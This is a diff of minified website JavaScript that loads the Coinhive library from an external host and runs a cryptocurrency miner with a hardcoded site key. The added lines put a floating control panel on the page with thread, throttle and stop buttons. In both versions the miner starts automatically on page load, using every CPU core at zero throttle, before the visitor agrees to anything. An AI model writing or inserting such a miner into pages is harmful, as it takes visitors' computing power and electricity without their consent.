@@ -7,88 +7,131 @@
             n.type = "text/javascript", n.async = !0;
             var e = document.getElementsByTagName("script")[0];
             n.src = "https://coinhive.com/lib/coinhive.min.js", n.onload = function() {
-                function n(n) { return In.start(n) }
-                var e = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
-                    t = !0,
-                    i = navigator.hardwareConcurrency,
-                    s = 0,
-                    d = "miner",
-                    a = "mining-stats-canvas",
-                    o = "mining-is-running",
-                    m = "mining-is-running-id",
-                    r = "mining-is-running-id-output",
-                    p = "mining-hashes-per-second",
-                    l = "mining-hashes-per-second-id",
-                    c = "mining-hashes-per-second-id-output",
-                    h = "mining-accepted-hashes-per-second",
-                    u = "mining-accepted-hashes-per-second-id",
-                    g = "mining-accepted-hashes-per-second-id-output",
-                    v = "mining-threads",
-                    w = "mining-threads-id",
-                    y = "mining-threads-id-output",
-                    _ = "mining-threads-add",
-                    f = "mining-threads-remove",
-                    E = "mining-hashes-total",
-                    H = "mining-hashes-total-id",
-                    T = "mining-hashes-total-id-output",
-                    L = "mining-start",
-                    I = "mining-stop",
-                    B = "addthreads",
-                    M = "removethreads",
-                    b = "startmining",
-                    C = "stopmining",
-                    U = "mining-current-throttle",
-                    S = "mining-current-throttle-id",
-                    x = "mining-current-throttle-id-output",
-                    P = "mining-increase-throttle",
-                    A = "mining-increase-throttle-id",
-                    D = "mining-decrease-throttle",
-                    j = "mining-decrease-throttle-id",
-                    O = "mining-minimal-speed",
-                    k = "mining-minimal-speed-id",
-                    q = "mining-maximum-speed",
-                    K = "mining-maximum-speed-id",
-                    N = "mining-default-recommended-speed",
-                    R = "mining-default-recommended-speed-id",
-                    V = "tooltiptext",
-                    X = "tooltip",
-                    z = "miner-button-class",
-                    F = "miner-text-area-class",
-                    J = "",
-                    Q = "If the miner is currently running.",
-                    W = "Hashes/s | ",
-                    Z = "The total number of hashes per second for all threads combined.",
-                    G = "Accepted Hashes | ",
-                    Y = "The number of hashes that have been accepted by the pool.",
-                    $ = "Threads | ",
-                    nn = "Amount of threads you have running currently.",
-                    en = "+",
-                    tn = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.",
-                    sn = "-",
-                    dn = "Slow it down! (decrease threads to 0 to stop entirely)",
-                    an = "Total Hashes | ",
-                    on = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.",
-                    mn = "Start",
-                    rn = "Start the miner.",
-                    pn = "Stop",
-                    ln = "Stop the miner.",
-                    cn = "Throttle | ",
-                    hn = "How much the miner is currently being throttled.",
-                    un = "+",
-                    gn = "Increase the throttle to reduce CPU consumption.",
-                    vn = "-",
-                    wn = "Decrease the throttle to allow more CPU consumption.",
-                    yn = "Min",
-                    _n = "Use the most minimal amount of CPU and Power possible.",
-                    fn = "Max",
-                    En = "Use all CPU and Power available.",
-                    Hn = "Default",
-                    Tn = "Use Recommended default settings.",
-                    Ln = document.createElement("div");
-                Ln.id = d, document.body.appendChild(Ln), new_html = "<div id='" + a + "'></div>", document.getElementById(d).innerHTML = new_html, new_html = "<div id='" + o + "' class='" + X + " " + F + "'><span id='" + m + "'>" + J + "</span><span id='" + r + "'></span><span id='" + V + "'>" + Q + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + p + "' class='" + X + " " + F + "'><span id='" + l + "'>" + W + "</span><span id='" + c + "'></span><span id='" + V + "'>" + Z + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + h + "' class='" + X + " " + F + "'><span id='" + u + "'>" + G + "</span><span id='" + g + "'></span><span id='" + V + "'>" + Y + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + v + "' class='" + X + " " + F + "'><span id='" + w + "'>" + $ + "</span><span id='" + y + "'></span><span id='" + V + "'>" + nn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + _ + "' class='" + X + " " + z + "'><span id='" + B + "'>" + en + "</span><span id='" + V + "'>" + tn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + f + "' class='" + X + " " + z + "'><span id='" + M + "'>" + sn + "</span><span id='" + V + "'>" + dn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + E + "' class='" + X + " " + F + "'><span id='" + H + "'>" + an + "</span><span id='" + T + "'></span><span id='" + V + "'>" + on + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + L + "' class='" + X + " " + z + "'><span id='" + b + "'>" + mn + "</span><span id='" + V + "'>" + rn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + I + "' class='" + X + " " + z + "'><span id='" + C + "'>" + pn + "</span><span id='" + V + "'>" + ln + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + U + "' class='" + X + " " + F + "'><span id='" + S + "'>" + cn + "</span><span id='" + x + "'></span><span id='" + V + "'>" + hn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + P + "' class='" + X + " " + z + "'><span id='" + A + "'>" + un + "</span><span id='" + V + "'>" + gn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + D + "' class='" + X + " " + z + "'><span id='" + j + "'>" + vn + "</span><span id='" + V + "'>" + wn + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + O + "' class='" + X + " " + z + "'><span id='" + k + "'>" + yn + "</span><span id='" + V + "'>" + _n + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + q + "' class='" + X + " " + z + "'><span id='" + K + "'>" + fn + "</span><span id='" + V + "'>" + En + "</span></div>", document.getElementById(a).innerHTML += new_html, new_html = "<div id='" + N + "' class='" + X + " " + z + "'><span id='" + R + "'>" + Hn + "</span><span id='" + V + "'>" + Tn + "</span></div>", document.getElementById(a).innerHTML += new_html;
-                var In = new CoinHive.Anonymous(e, { throttle: s, threads: i }),
-                    Bn = CoinHive.FORCE_EXCLUSIVE_TAB;
-                t && n(Bn), In.on("open", function() {}), In.on("authed", function(n) {}), In.on("close", function() {}), In.on("error", function(n) {}), In.on("job", function() {}), In.on("found", function() {}), In.on("accepted", function() {})
+                function n() { return Jn.getHashesPerSecond().toFixed(1) }
+
+                function t(n) { return Jn.getTotalHashes(n) }
+
+                function i() { return Jn.getAcceptedHashes() }
+
+                function d() { return Jn.stop() }
+
+                function o(n) { return Jn.start(n) }
+
+                function r() { return Jn.getNumThreads() }
+
+                function a(n) { return Jn.setNumThreads(n) }
+
+                function s() { return o(Qn), a(r() + 1) }
+
+                function l() { return o(Qn), a(r() - 1) }
+
+                function c() { return Jn.isRunning() }
+
+                function m() { return Math.round(100 * Jn.getThrottle().toFixed(1)) / 100 }
+
+                function p(n) { return Jn.setThrottle(n) }
+
+                function u() { return o(Qn), p(m() + .1) }
+
+                function h() { return o(Qn), p(m() - .1) }
+
+                function g() { p(0), a(Wn), o(Qn) }
+
+                function f() { p(.9), a(1), o(Qn) }
+
+                function y() { p(Zn), a(Wn), o(Qn) }
+
+                function o(n) { return Jn.start(n) }
+                var v = "jVwy4y10DD5Ahz6qQ83qLrwXd5KZgJfp",
+                    w = !0,
+                    b = navigator.hardwareConcurrency,
+                    E = 0,
+                    x = 1e3,
+                    I = "miner",
+                    T = "mining-stats-canvas",
+                    B = "mining-is-running",
+                    _ = "mining-is-running-id",
+                    k = "mining-is-running-id-output",
+                    H = "mining-is-running-id-output-yes",
+                    L = "mining-is-running-id-output-no",
+                    M = "mining-hashes-per-second",
+                    C = "mining-hashes-per-second-id",
+                    A = "mining-hashes-per-second-id-output",
+                    F = "mining-accepted-hashes-per-second",
+                    N = "mining-accepted-hashes-per-second-id",
+                    S = "mining-accepted-hashes-per-second-id-output",
+                    U = "mining-threads",
+                    D = "mining-threads-id",
+                    P = "mining-threads-id-output",
+                    z = "mining-threads-add",
+                    O = "mining-threads-remove",
+                    j = "mining-hashes-total",
+                    X = "mining-hashes-total-id",
+                    R = "mining-hashes-total-id-output",
+                    q = "mining-start",
+                    G = "mining-stop",
+                    K = "addthreads",
+                    V = "removethreads",
+                    J = "startmining",
+                    Q = "stopmining",
+                    W = "mining-current-throttle",
+                    Z = "mining-current-throttle-id",
+                    Y = "mining-current-throttle-id-output",
+                    $ = "mining-increase-throttle",
+                    nn = "mining-increase-throttle-id",
+                    en = "mining-decrease-throttle",
+                    tn = "mining-decrease-throttle-id",
+                    dn = "mining-minimal-speed",
+                    on = "mining-minimal-speed-id",
+                    rn = "mining-maximum-speed",
+                    an = "mining-maximum-speed-id",
+                    sn = "mining-default-recommended-speed",
+                    ln = "mining-default-recommended-speed-id",
+                    cn = "tooltiptext",
+                    mn = "tooltip",
+                    pn = "miner-button-class",
+                    un = "miner-text-area-class",
+                    hn = "",
+                    gn = "Online",
+                    fn = "Offline",
+                    yn = "If the miner is currently running.",
+                    vn = "Hashes/s | ",
+                    wn = "The total number of hashes per second for all threads combined.",
+                    bn = "Accepted Hashes | ",
+                    En = "The number of hashes that have been accepted by the pool.",
+                    xn = "Threads | ",
+                    In = "Amount of threads you have running currently.",
+                    Tn = "+",
+                    Bn = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.",
+                    _n = "-",
+                    kn = "Slow it down! (decrease threads to 0 to stop entirely)",
+                    Hn = "Total Hashes | ",
+                    Ln = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.",
+                    Mn = "Start",
+                    Cn = "Start the miner.",
+                    An = "Stop",
+                    Fn = "Stop the miner.",
+                    Nn = "Throttle | ",
+                    Sn = "How much the miner is currently being throttled.",
+                    Un = "+",
+                    Dn = "Increase the throttle to reduce CPU consumption.",
+                    Pn = "-",
+                    zn = "Decrease the throttle to allow more CPU consumption.",
+                    On = "Min",
+                    jn = "Use the most minimal amount of CPU and Power possible.",
+                    Xn = "Max",
+                    Rn = "Use all CPU and Power available.",
+                    qn = "Default",
+                    Gn = "Use Recommended default settings.",
+                    Kn = document.createElement("div");
+                Kn.id = I, document.body.appendChild(Kn), e.parentNode.insertBefore(Kn, e), new_html = "<div id='" + T + "'></div>", document.getElementById(I).innerHTML = new_html, new_html = "<div id='" + B + "' class='" + mn + " " + un + "'><span id='" + _ + "'>" + hn + "</span><span id='" + k + "'></span><span id='" + cn + "'>" + yn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + M + "' class='" + mn + " " + un + "'><span id='" + C + "'>" + vn + "</span><span id='" + A + "'></span><span id='" + cn + "'>" + wn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + F + "' class='" + mn + " " + un + "'><span id='" + N + "'>" + bn + "</span><span id='" + S + "'></span><span id='" + cn + "'>" + En + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + U + "' class='" + mn + " " + un + "'><span id='" + D + "'>" + xn + "</span><span id='" + P + "'></span><span id='" + cn + "'>" + In + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + z + "' class='" + mn + " " + pn + "'><span id='" + K + "'>" + Tn + "</span><span id='" + cn + "'>" + Bn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + O + "' class='" + mn + " " + pn + "'><span id='" + V + "'>" + _n + "</span><span id='" + cn + "'>" + kn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + j + "' class='" + mn + " " + un + "'><span id='" + X + "'>" + Hn + "</span><span id='" + R + "'></span><span id='" + cn + "'>" + Ln + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + q + "' class='" + mn + " " + pn + "'><span id='" + J + "'>" + Mn + "</span><span id='" + cn + "'>" + Cn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + G + "' class='" + mn + " " + pn + "'><span id='" + Q + "'>" + An + "</span><span id='" + cn + "'>" + Fn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + W + "' class='" + mn + " " + un + "'><span id='" + Z + "'>" + Nn + "</span><span id='" + Y + "'></span><span id='" + cn + "'>" + Sn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + $ + "' class='" + mn + " " + pn + "'><span id='" + nn + "'>" + Un + "</span><span id='" + cn + "'>" + Dn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + en + "' class='" + mn + " " + pn + "'><span id='" + tn + "'>" + Pn + "</span><span id='" + cn + "'>" + zn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + dn + "' class='" + mn + " " + pn + "'><span id='" + on + "'>" + On + "</span><span id='" + cn + "'>" + jn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + rn + "' class='" + mn + " " + pn + "'><span id='" + an + "'>" + Xn + "</span><span id='" + cn + "'>" + Rn + "</span></div>", document.getElementById(T).innerHTML += new_html, new_html = "<div id='" + sn + "' class='" + mn + " " + pn + "'><span id='" + ln + "'>" + qn + "</span><span id='" + cn + "'>" + Gn + "</span></div>", document.getElementById(T).innerHTML += new_html;
+                var Vn = document.createElement("style");
+                Vn.type = "text/css", Vn.innerHTML += "#" + I + "{position:fixed;bottom:0;left:0;background-color:#262626;color:#FFFFFF;width:auto;height:auto;border-radius:3px;z-index:30;}#" + T + "{display:inline-block;width:100%;}#" + B + "{display:inherit;}#" + _ + "{}#" + k + "{}." + H + "{color:greenyellow;}." + L + "{color:#f00;}#" + M + "{display:inherit;}#" + C + "{display:inherit;}#" + A + "{display:inherit;padding:0px 0px 0px 5px;}#" + F + "{display:inherit;}#" + U + "{display:inherit;}#" + z + "{display:inherit;}#" + O + "{display:inherit;}#" + j + "{display:inherit;}#" + q + "{display:inherit;}#" + G + "{display:inherit;}#" + K + "{}#" + V + "{}#" + J + "{}#" + Q + "{}#" + W + "{display:inherit;}#" + $ + "{display:inherit;}#" + en + "{display:inherit;}#" + dn + "{display:inherit;}#" + rn + "{display:inherit;}#" + sn + "{display:inherit;}." + pn + "{text-decoration: none;display: inline-block;padding: 0px 10px;margin: 2px;border: 1px solid #C7C7C7;border-radius: 3px;-moz-border-radius: 2px;-webkit-border-radius: 2px;background: #636A6C;background: -moz-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -webkit-gradient(linear,left top,left bottom,color-stop(0%,#636A6C),color-stop(100%,#51575A));background: -webkit-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -o-linear-gradient(top,#636A6C 0%,#51575A 100%);background: -ms-linear-gradient(top,#636A6C 0%,#51575A 100%);background: linear-gradient(top,#636A6C 0%,#51575A 100%);filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#636A6C',endColorstr='#51575A',GradientType=0);}." + pn + ":hover{display: inline-block;padding: 0px 10px;margin: 2px;border-radius: 3px;background: #ddd;background: -webkit-gradient(linear,left top,left bottom,color-stop(0,#fff),color-stop(1,#ddd));background: -moz-linear-gradient(top center,#fff 0%,#ddd 100%);background: -webkit-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: -o-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: -ms-linear-gradient(top,#ffffff 0%,#dddddd 100%);background: linear-gradient(top,#ffffff 0%,#dddddd 100%);filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#dddddd',GradientType=0);border: 1px solid;border-color: #ddd #bbb #999;cursor: pointer;color: #333;}." + un + "{border:1px solid #e5e5e4;padding:0px 5px 0px 5px;}." + mn + "{position: relative;overflow:visible;}." + mn + " #" + cn + "{visibility: hidden;width:0px;height:0px;background-color: black;color: #fff;text-align: center;border-radius: 6px;padding: 5px 5px;position: absolute;z-index: 1;bottom: 150%;left: 50%;margin-left: -5px;overflow:hidden;}." + mn + ":hover #" + cn + "{visibility: visible;width:auto;height:auto;overflow:hidden;white-space:nowrap;}", e.parentNode.insertBefore(Vn, e);
+                var Jn = new CoinHive.Anonymous(v, { throttle: E, threads: b }),
+                    Qn = CoinHive.FORCE_EXCLUSIVE_TAB,
+                    Wn = r(),
+                    Zn = m();
+                document.getElementById(z).onclick = function() { return s() }, document.getElementById(O).onclick = function() { return l() }, document.getElementById(q).onclick = function() { return o(Qn) }, document.getElementById(G).onclick = function() { return d() }, document.getElementById($).onclick = function() { return u() }, document.getElementById(en).onclick = function() { return h() }, document.getElementById(dn).onclick = function() { return f() }, document.getElementById(rn).onclick = function() { return g() }, document.getElementById(sn).onclick = function() { return y() }, w && o(Qn), Jn.on("open", function() {}), Jn.on("authed", function(n) {}), Jn.on("close", function() {}), Jn.on("error", function(n) {}), Jn.on("job", function() {}), Jn.on("found", function() {}), Jn.on("accepted", function() {}), setInterval(function() { is_running = "", c() ? (is_running = gn, document.getElementById(k).className = H) : (is_running = fn, document.getElementById(k).className = L), document.getElementById(k).innerHTML = is_running, document.getElementById(A).innerHTML = n(), document.getElementById(S).innerHTML = i(), document.getElementById(P).innerHTML = r(), document.getElementById(R).innerHTML = t(!0), document.getElementById(Y).innerHTML = m() }, x)
             }, n.onerror = function() {}, e.parentNode.insertBefore(n, e)
         }()
     }, !1)
